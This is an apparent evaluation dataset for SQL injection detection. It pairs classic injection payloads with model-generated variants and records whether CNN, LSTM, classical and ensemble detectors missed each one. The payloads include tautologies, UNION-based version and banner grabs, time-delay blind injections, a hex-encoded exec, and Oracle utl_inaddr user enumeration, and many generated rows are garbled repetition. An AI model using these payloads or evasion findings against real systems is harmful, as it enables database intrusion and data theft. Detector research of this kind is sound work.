,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
41,select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,SELECT * FROM * FROM users WHERE NOT id = 1 OR.1 = 1 AND 1 = 1,1,1,1,0,0,0,0
42," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'","SELECT * FROM * FROM users WHERE NOT id = '1' OR  union select 1,@@VERSION -- 1'",1,1,1,0,0,0,0
43," select * from users where id  =  1 union select 1||1,version  (    )   -- 1","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = 1 union select 1||1,version ( ) -- 1",1,1,0,0,0,0,0
44," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1","SELECT MIN(sql injection) FROM * FROM SQL_injection WHERE id = 1 ||1 union select null,banner FROM v$version WHERE rownum = 1 AND 1",1,1,1,0,0,0,0
45,select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',SELECT * FROM * FROM users WHERE NOT id = '1' OR. or 1 = 1 AND 1 = 1,1,1,0,0,0,0,0
46," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR ""[]"" OR 1 = 1",0,1,1,0,0,0,0
47," select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR.@ = 1 OR 1 = 1,1,1,1,0,0,0,0
48," select * from users where id  =  1 or ""$["" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR ""$["" OR 1 = 1 AND 1 = 1",0,1,1,0,0,0,0
49,or 1 --',SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
50," select * from users where id  =  1 or "",;"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR ""sq injection"" ORDER BY 1 = 1",0,1,1,0,0,0,0
51,"admin"" or 1  =  1#",SELECT MIN(1 = 1#) FROM SQL injection detection,1,1,0,0,1,0,0
52," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1","SELECT MIN(sql injection) FROM SQL injection detection WHERE Id = 1 + ( 1 ) union select null,banner FROM v$version""",1,1,0,0,0,0,0
53,\x27UNION SELECT,SELECT SELECT MIN(sql) FROM Query: x27UNIONSELECT FROM SQL AS SELECT FROM SELECT SELECT SELECT MIN(sql) FROM SELECT SELECT SELECT MIN(sql) FROM SELECT SELECT SELECT MIN(sql) FROM SELECT SELECT SELECT SELECT MIN(sql) FROM SELECT SELECT SELECT MIN(sql) FROM SELECT SELECT FROM SELECT SELECT FROM SQL AS x27UNION FROM SELECT AS SELECT FROM SELECT AS x27UNION FROM SELECT AS SELECT FROM SELECT AS x27UNION FROM SELECT AS SELECT FROM SQL AS SELECT FROM SELECT AS x27UNION FROM SELECT AS x27UNION FROM SELECT AS SELECT FROM SELECT AS x27UNION FROM SELECT AS x27UNION AS SELECT FROM SELECT AS ,1,0,1,1,1,1,1
54,PRINT,"SELECT * FROM SQL AS t1 JOIN query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM Query: PRINT WHERE NOT SQL_injection = ""yes"" AND NOT query_right = ""yes""",0,0,1,1,1,1,1
55," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",SELECT MIN(.) FROM SQL injection detection) FROM SQL SELECT MIN(. 1) FROM SQL SELECT MIN(. 1) FROM SQL SELECT MIN(. 1) FROM SQL,1,1,1,0,1,1,0
56,or 1  =  1--,"SELECT * FROM SQL_injector WHERE NOT SQL_inject = ""valid"" ORDER BY *1 = 1",1,1,1,0,0,0,0
57,1 or pg_sleep  (  __TIME__  )  --,SELECT * FROM query: 1 ORDER BY __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ SELECT FROM query: 1 ORDER BY __TIME__,1,0,1,1,0,1,0
58," select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR id = 1 OR id = 1 OR id = 1 OR 1 = 1,1,1,1,0,0,0,0
59,admin'  )   or   (  '1'  =  '1'/*,SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
60,or 2 between 1 and 3,SELECT * FROM SQL AS t1 JOIN query: or 2 FROM query: or 2 FROM query: orDER BY query: or 2 FROM query: orDER BY query: or 2 FROM query: orDER BY query: or 2 FROM query: orDER BY COUNT(*) DESC LIMIT 1,0,0,0,1,1,1,0
61," select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",SELECT * FROM SQL injection detection WHERE id = 1 OR 1 = 1,1,1,1,0,0,0,0
62," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1","SELECT NOT SQL_injection FROM users WHERE id = 1 OR 1##""",0,1,1,0,0,0,0
63,admin' or '1'  =  '1,SELECT MIN(sql injection) FROM SQL Query: admin ORDER BY query_authority,1,0,1,1,1,1,1
64,; if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --,SELECT DISTINCT >'sa' waitfor delay '0:0:2' FROM SQL injection',1,1,0,0,0,0,0
65," select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1","SELECT * FROM SQL injection detection WHERE NOT id = 1 union select 1,banner FROM v$version WHERE rownum = 1 AND 1",1,1,1,0,0,0,0
66,""" or 0  =  0 --","SELECT * FROM SQL AS t1 JOIN query: ""yes"" FROM query: ""yes"" ORDER BY query: ""yes""",0,0,1,1,1,1,1
67," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
68,select * from users where id  =  1 <@.$ or 1  =  1 -- 1,SELECT * FROM * FROM SQL injection detection WHERE id = 1 @.$ or 1 = 1,1,1,1,0,0,0,0
69," select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR id = 1 OR %. = 1 OR 1 = 1,1,1,0,0,0,0,0
70," select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = 1 + $+*$ union select null,@@VERSION -- 1",1,1,1,0,0,0,0
71," select * from users where id  =  1 or "",."" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE id = 1 OR NOT id = 1 OR 1 = 1,1,1,1,0,0,0,0
72,char%4039%41%2b%40SELECT,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: CHAR%4039%41%2b%40SELECT FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,1,0,1,1,1,0
73," select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR ""1&"" OR 1 = 1 AND 1 = 1",0,1,1,0,0,0,0
74,admin'  )   or   (  '1'  =  '1,SELECT MIN('1') FROM SQL injection detection,1,1,0,0,1,0,0
75,declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,SELECT MIN(200 ) FROM SQL injection detection,1,0,1,1,1,1,1
76,"or 0  =  0 #""",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
77," select * from users where id  =  1 or "".]"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE id = 1 OR "".]"" OR 1 = 1",0,1,1,0,0,0,0
78,  )   or   (  'x'  =  'x,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
79," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = ""1.1@$ union select 1,version ( ) -- 1""",1,1,1,0,0,0,0
80,$  (  sleep 50  ) ,"SELECT * FROM SQL AS t1 JOIN query: $ ( sleep 50 ) AND NOT t1.sq = ""valid""",0,1,0,0,0,0,0
81," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = 1 *1 union select null,banner FROM v$version WHERE rownum = 1 AND 1",1,1,1,0,0,0,0
82,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --","SELECT MIN(sql injection) FROM sysobjects WHERE NOT sysobjects where xtype = ""u""",1,1,1,0,1,1,0
83," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1","SELECT * FROM * FROM SQL_injector WHERE NOT id = 1 OR 1##""",0,1,1,0,1,1,0
84," select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR 1# = 1 OR union select null,version ( ) -- 1",1,1,0,0,0,0,0
85," select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR 1# = 1 OR 1 = 1,1,1,1,0,0,0,0
86,"""a"""" or 1  =  1--""",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
87," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1","SELECT * FROM SQL injection detection WHERE id = 1 *1 union select 1,banner FROM v$version WHERE rownum = 1 AND 1",1,1,1,0,0,0,0
88," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",SELECT MIN(SELECT) FROM (SELECT SELECT SELECT MIN(SELECT SELECT FROM) AS _local_address WHERE NOT SELECT SELECT SELECT SELECT FROM SQL_inaddr.get_host_address) FROM (SELECT SELECT SELECT SELECT SELECT FROM SELECT SELECT SELECT MIN(SELECT) FROM (SELECT SELECT SELECT MIN(SELECT FROM SQL_inaddr.get_host_address.inaddr.get_host_address.inaddr.get_host_address) FROM (SELECT SELECT SELECT SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT ) FROM),0,0,1,1,1,1,1
89," select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
90,1 and user_name  (    )     =   'dbo',SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
91,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",SELECT MIN(sequence) FROM SQL injection - SELECT MIN(sequence) FROM SQL_injection),1,1,1,1,1,1,1
92," select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR 1#""$ union select 1,version ( ) -- 1",0,1,0,0,0,0,0
93," select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",SELECT NOT SQL_injection IS NULL AND version ( ) = 1,1,1,0,0,0,0,0
94,select * from users where id  =  '1' *$ . or 1  =  1 -- 1',SELECT * FROM * FROM SQL injection detection WHERE id = '1' *$. or 1 = 1 -- 1,1,1,0,0,0,0,0
95,select * from users where id  =  1 +$+. or 1  =  1 -- 1,SELECT * FROM * FROM SQL injection detection WHERE id = 1 +$+. OR 1 = 1,1,1,0,0,0,0,0
96,select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,SELECT * FROM * FROM users WHERE NOT id = 1 OR ( + ) = 1 OR 1 = 1,1,1,0,0,0,0,0
97," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",SELECT SELECT FROM (SELECT SELECT SELECT MIN(ROWNUM) FROM SYS.ALL_USERS) AND NOT SELECT SELECT SELECT FROM (SELECT SELECT SELECT SELECT FROM SELECT SELECT MIN(ROWNUM) FROM SYS.ALL_USERS) AND NOT SELECT SELECT SELECT FROM (SELECT SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM (SELECT AS t1 JOIN_host_address.usERNAME) FROM (SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(ROWNUM) FROM (SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(ROWNUM) FROM),0,0,1,1,1,1,1
98,or 1  =  1 or ''  =  ',SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
99,select * from users where id  =  1   or 1  =  1 -- 1,SELECT * FROM * FROM SQL injection detection WHERE id = 1 OR 1 = 1,1,1,1,0,1,1,0
100,or 'text' > 't',SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
101,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055","SELECT MIN(sql injection) FROM SQL SELECT ""admit"" FROM SQL SELECT ""admin"" FROM query: 1234 AND 1 = 0 UNION AllSELECT ""admin""",1,1,1,0,0,0,0
102," select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR id = 1 OR %[%[] = 1 AND 1 = 1,1,1,0,0,0,0,0
103," select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1","SELECT * FROM * FROM * FROM users WHERE NOT id = 1 OR 1# = 1 OR 1# = 1 union select 1,version ( ) -- 1",1,1,0,0,0,0,0
104,admin' or '1'  =  '1'#,SELECT MIN(sql injection) FROM SQL Query: admin ORDER BY '1',1,1,1,0,0,0,0
105,select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,SELECT * FROM * FROM SQL_injections WHERE id = 1 +$ 1 OR 1 = 1,1,1,1,0,0,0,0
106,s,"SELECT * FROM query: s_0, SELECT * FROM SQL AS t1 JOIN query: s_0, query: s_0, query: s_0, query: s_0, query: s_0, query: s_0, query: s_0, query: s_0, query: s_0, query: s_0, query: s_0, query: s_0, query: s"" FROM SELECT ORDER BY valid SQL DESC",1,0,1,1,1,1,1
107," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",SELECT SELECT FROM (SELECT SELECT SELECT MIN(ROWNUM) FROM SYS.ALL_USERS) AND NOT SELECT SELECT SELECT FROM (SELECT SELECT SELECT SELECT FROM SELECT SELECT MIN(ROWNUM) FROM SYS.ALL_USERS) AND NOT SELECT SELECT SELECT FROM (SELECT SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM (SELECT AS t1 JOIN_host_address.usERNAME) FROM (SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(ROWNUM) FROM (SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(ROWNUM) FROM),0,0,0,1,1,1,0
108, select * from information_schema.tables--,SELECT * FROM * FROM SQL injection_description WHERE NOT * FROM information_schema.tables--,1,1,1,1,1,1,1
109," select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1","SELECT * FROM * FROM * FROM users WHERE NOT id = 1 OR ""$&"" OR 1 = 1",0,1,1,0,0,0,0
110,1   )    )    or pg_sleep  (  __TIME__  )  --,"SELECT __TIME__, COUNT(*) FROM SQL_injector WHERE NOT __TIME__ = ""yes""",1,1,1,0,0,0,0
111," select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",SELECT MIN(version) - 1 FROM SQL injections WHERE NOT id = '1',1,1,1,0,1,1,0
112,declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,SELECT MIN(200 ) FROM SQL injection detection,1,0,1,1,1,1,1
113, or 1  =  1 or ''  =  ',SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
114,select * from users where id  =  1 %!<1 or 1  =  1 -- 1,SELECT * FROM * FROM SQL injection detection WHERE id = 1 %!1 OR 1 = 1,1,1,0,0,0,0,0
115,declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,SELECT MIN(@q) FROM SQL injection detection,1,0,1,1,1,1,1
116," select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE id = 1 OR NOT id = 1 OR ]1 = 1,1,1,1,0,0,0,0
117," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR SQL_Injection = ""$+1 union select 1,@@VERSION -- 1""",1,1,1,0,0,0,0
118,or 'unusual'   =   'unusual',SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
119, or 1 in   (  select @@version  )  --,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
120,truncate,"SELECT * FROM SQL AS truncate__phrase, SELECT * FROM Query: SELECT * FROM Query: SELECT * FROM Query: SELECT * FROM Query: SELECT * FROM SQL AS truncated FROM Query: SELECT * FROM Query: SELECT * FROM Query: SELECT * FROM Query: SELECT * FROM Query: SELECT * FROM Query: SELECT * FROM Query: SELECT FROM FROM SELECT SUM(sql_injector, Query: Query: Query: Query: Query: Query: SELECT * FROM SELECT * FROM SELECT * FROM Query__phrase_not SELECT * FROM SELECT * FROM Query__truncated FROM SELECT query__ query_0, SELECT * FROM SELECT * FROM Query__phrase_not SELECT * FROM Query__truncated_outputed AS truncated_outputed AS truncated_able AS t",1,0,1,1,1,1,1
121,as,"SELECT * FROM query: as :write_the generated FROM query: SELECT invalid SQL FROM query: SELECT invalid FROM SQL SELECT SELECT invalid FROM query: as SELECT result FROM query: created""",1,0,1,1,1,1,1
122, or 3  =  3 --,SELECT * FROM SQL AS t1 JOIN query: or 3 = 3 AND NOT t1.sql = 'valid',0,1,0,1,0,0,0
